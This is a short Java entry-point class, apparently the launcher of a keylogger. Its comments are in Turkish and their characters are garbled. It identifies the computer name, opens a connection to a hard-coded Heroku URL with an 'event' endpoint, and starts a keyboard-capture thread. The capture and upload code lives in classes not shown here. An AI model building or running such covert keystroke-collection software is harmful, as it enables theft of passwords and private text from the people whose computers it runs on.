package com.byrfb.main;

import com.byrfb.ComputerNameSettings.ComputerNameSolver;
import com.byrfb.connection.Connection;
import com.byrfb.keyboard.Keyboard;
/*
 * 
 * Bu s�n�f bizim ana ba�lat�c� s�n�f�m�z
 * computer name solver zaten isim ��z�c� oldu�u ad�ndan da belli
 * 
 */
public class Main {
	/*
	 * herokudan ald���m�z domain ve hostingin bar�nmas� i�llemi yap�lmakta
	 * 
	 */
	public static final String url = "https://intense-cove-31943.herokuapp.com/";
	public static final String sendEvent = "event";

	public static void main(String[] args) {
		ComputerNameSolver solver = new ComputerNameSolver();
		Connection con = new Connection();
		Keyboard key = new Keyboard();
		key.start();
	}

}
